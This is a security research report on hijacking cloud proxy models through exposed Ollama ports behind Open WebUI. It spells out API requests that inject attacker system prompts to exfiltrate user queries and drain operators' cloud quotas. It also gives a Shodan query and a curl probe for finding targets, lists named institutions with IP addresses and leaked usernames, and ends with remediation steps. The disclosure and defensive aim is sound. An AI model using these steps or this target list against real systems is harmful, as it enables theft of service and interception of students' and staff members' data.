# Open WebUI: Cloud Proxy Model Quota Hijacking

_NuClide Research · 2026-05-01_

---

## What Cloud Proxy Models Are

Ollama supports "cloud proxy" models, thin modelfile wrappers that route inference requests to external cloud AI providers (Google Gemini, DeepSeek, MiniMax, GLM, etc.). The operator pays per-token to the cloud provider; Ollama handles the relay.

These models appear in `/api/tags` with `:cloud` suffix and have zero local size:

```json
{"name":"gemini-3-flash-preview:cloud","size":0}
{"name":"deepseek-v4-pro:cloud","size":0}
{"name":"minimax-m2.7:cloud","size":0}
```

The cloud API credentials are stored in the Ollama server configuration, not in the modelfile itself.

---

## The Hijacking Chain

When an operator runs Open WebUI + Ollama with cloud proxy models and leaves port 11434 open:

```
1. Attacker queries /api/tags on raw Ollama port (no auth)
   → discovers cloud proxy models

2. Attacker injects system prompt into cloud proxy model:
   POST http://TARGET:11434/api/create
   {"model":"deepseek-v4-pro:cloud",
    "from":"deepseek-v4-pro:cloud",
    "system":"[attacker prompt — instructs model to exfiltrate user queries]"}

3. Every user who chats with deepseek-v4-pro through Open WebUI now:
   - Sends their query to the attacker-controlled prompt context
   - The operator's cloud API credits pay for every attacker-directed inference
   - User data is potentially forwarded to the cloud provider under attacker framing

4. Secondary: attacker can also directly invoke cloud proxy for own use:
   POST http://TARGET:11434/api/generate
   {"model":"gemini-3-flash-preview:cloud","prompt":"..."}
   → operator's Gemini API key pays for attacker's inference
```

---

## Live Findings (2026-05-01)

### Delaware Valley Regional Consortium: `204.186.103.4`

**Classification:** Educational Technology Cooperative, K-12 School Districts (PA/NJ)  
**Provider:** Hetzner (Finland)  
**Ollama Version:** 0.17.5  
**Open WebUI Version:** 0.8.8  
**Cloud proxy models (5 active subscriptions):**

| Model | Cloud Provider |
|-------|----------------|
| `deepseek-v4-pro:cloud` | DeepSeek API |
| `minimax-m2.7:cloud` | MiniMax API |
| `minimax-m2.1:cloud` | MiniMax API |
| `minimax-m2.5:cloud` | MiniMax API |
| `gemini-3-flash-preview:cloud` | Google Gemini API |

**Impact:** Model injection on the raw Ollama port silently redirects all student/staff AI interactions under attacker-controlled system prompts. Five cloud API subscriptions are exposed to quota drain. Educational data (student queries, assignments, staff workflows) would pass through attacker-framed context.

**Injection surface:** Port 11434, no auth. One curl. All 5 cloud proxy models injectable.

---

### Microsoft Azure US: `20.124.183.184`

**Provider:** Azure (Microsoft Corporation)  
**Ollama Version:** 0.17.6  
**Cloud proxy:** `minimax-m2.7:cloud`  
**Open WebUI:** 0.8.12, auth enabled  
**Bypass:** Raw Ollama port 11434 open, MiniMax API key exposed to quota drain

---

### WIIT AG Germany: `213.202.254.150`

**Provider:** WIIT AG (enterprise IT services, DE)  
**Ollama Version:** 0.21.0  
**Cloud proxy:** `minimax-m2.7:cloud`  
**Open WebUI:** 0.9.2 (MCP-capable), auth enabled  
**Chain:** Model injection → MCP tool hijacking possible (v0.9.2 ships MCP integration)

---

## University + Education Scale (2026-05-01)

Ollama with `:cloud` models confirmed at universities across 10+ countries:

| Institution | Country | Cloud Proxies | Live (200 OK) | Notes |
|-------------|---------|---------------|---------------|-------|
| Purdue University Northwest | US-IN | 4 | **3 CONFIRMED** | qwen3-coder-next, gemma4:31b, gpt-oss:20b |
| SUNY Buffalo | US-NY | 1 | **1 CONFIRMED** | gemma4:31b-cloud |
| POSTECH | South Korea | 18 | unconfirmed | Includes kimi-k2:1t-cloud (1T params) |
| Shiv Nadar University | India | 18 | unconfirmed | 3-node cluster, 671B local model |
| Hanoi University | Vietnam | 18 | unconfirmed | Docker container ID in cred leak |
| Chulalongkorn University | Thailand | 3 | unconfirmed | Kimi K2.6, DeepSeek, Qwen; cred leak (user: llm) |
| KTH Royal Institute of Tech | Sweden | 2 | unconfirmed | Dual-node, abliterated model as root |
| Columbia University | US-NY | 1 | unconfirmed | cred leak (user: seascvn066) |
| Keio University | Japan | 2 | unconfirmed | qwen3.5:122b local accessible |
| Tech Univ. of Crete | Greece | 1 | unconfirmed | cred leak (user: arian) |
| NTUA Athens | Greece | 0 | N/A | deepseek-coder-v2:236b open locally |
| Univ. of Western Ontario | Canada | 1 | unconfirmed | ECE department |
| City of Cartersville | US-GA | 1 | unconfirmed | Local government, Windows, cred leak (WIN-QAHP18EJH8I) |
| DVRC / hts.k12.nj.us | US-NJ | 5 | **2 CONFIRMED** | K-12; minimax-m2.1 288 tokens |
| Meriwether Lewis Elec. Coop | US-TN | 0 | N/A | Electric utility, 235B model |
| Thailand Ministry of Public Health | Thailand | 0 | N/A | Healthcare gov, vision model |

**Free-tier cloud proxy models** (return 200 OK without credentials):
- `gemma4:XX-cloud` (Google Gemma)
- `gpt-oss:XX-cloud` (OpenAI GPT-OSS)
- `qwen3-coder-next:cloud` (Alibaba Qwen)
- `minimax-m2.1:cloud`, `minimax-m2.5:cloud` (MiniMax free tier)

**Paid-tier (return 401)**:
- `deepseek-v4-pro:cloud`, `kimi-k2.6:cloud`, `deepseek-v3.1:671b-cloud`, `qwen3.5:397b-cloud`, most premium models

---

## Global Scale Estimate

| Metric | Value |
|--------|-------|
| Open WebUI instances on Shodan (port 3000) | **7,273** |
| Sample with raw Ollama port also open | **33%** (14/42) |
| Estimated bypass-exposed instances | **~2,400** |
| Auth disabled entirely | ~1–5% |
| Instances with cloud proxy models | ~15–20% of Ollama-open set |
| University Ollama instances | **225** |
| University Open WebUI instances | **84** |
| Universities with cloud proxy models | ~20% of university Ollama set |

---

## Detection Query (Shodan)

```
http.html:"Open WebUI" port:3000
```

Then probe each hit:
```bash
curl http://TARGET:11434/api/tags | jq '[.models[].name | select(endswith(":cloud"))]'
```
Any `:cloud` model = active cloud subscription exposed to quota hijack via model injection.

---

## Remediation

**Immediate:**
```bash
# Bind Ollama to loopback — this is the fix
OLLAMA_HOST=127.0.0.1:11434

# Verify: should refuse from external
curl http://EXTERNAL_IP:11434/api/tags  # should timeout
```

**Audit existing injection:**
```bash
# Check system prompts on all models
for model in $(curl -s http://localhost:11434/api/tags | jq -r '.models[].name'); do
  echo "=== $model ==="
  curl -s http://localhost:11434/api/show -d "{\"model\":\"$model\"}" | jq .system
done
```
